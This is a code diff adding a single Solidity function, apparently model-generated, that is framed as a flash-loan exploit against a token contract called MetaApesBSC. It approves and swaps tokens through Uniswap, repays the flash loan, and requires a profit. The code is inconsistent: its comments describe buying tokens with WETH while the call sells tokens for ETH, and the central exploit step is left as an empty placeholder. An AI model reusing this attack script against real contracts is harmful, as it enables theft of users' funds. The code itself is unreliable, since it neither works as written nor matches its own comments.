@@ -1,0 +1,39 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Mint tokens in exchange for WETH
+    // Request approval for the tokens
+    IMetaApesBSC(target).approve(address(uniswapRouter), type(uint256).max);
+    
+    // Step 2: Determine the token pair for the swap
+    address pairAddress = uniswapRouter.factory().getPair(token, uniswapRouter.WETH());
+    require(pairAddress != address(0), "Pair does not exist");
+
+    // Step 3: Swap WETH for tokens using Uniswap
+    address[] memory path = new address[](2);
+    path[0] = uniswapRouter.WETH();
+    path[1] = token;
+
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        amount,
+        0, // Accept any amount of Tokens
+        path,
+        address(this),
+        block.timestamp + 1000
+    );
+
+    // Step 4: Transfer the acquired tokens to the flash loan provider
+    uint256 tokenBalance = IERC20(token).balanceOf(address(this));
+    require(tokenBalance > 0, "No tokens were acquired");
+
+    // Step 5: Perform operations that will lead to obtaining more tokens
+    // Example: interacting with target contract or any other logic that uses acquired tokens
+
+    // Step 6: Return the flash loan amount
+    uint256 remainingTokens = tokenBalance - amount;
+    IERC20(token).transfer(flashloanProvider, amount);
+
+    require(remainingTokens > 0, "No profit was made");
+}
+</executeExploitCode>
+```
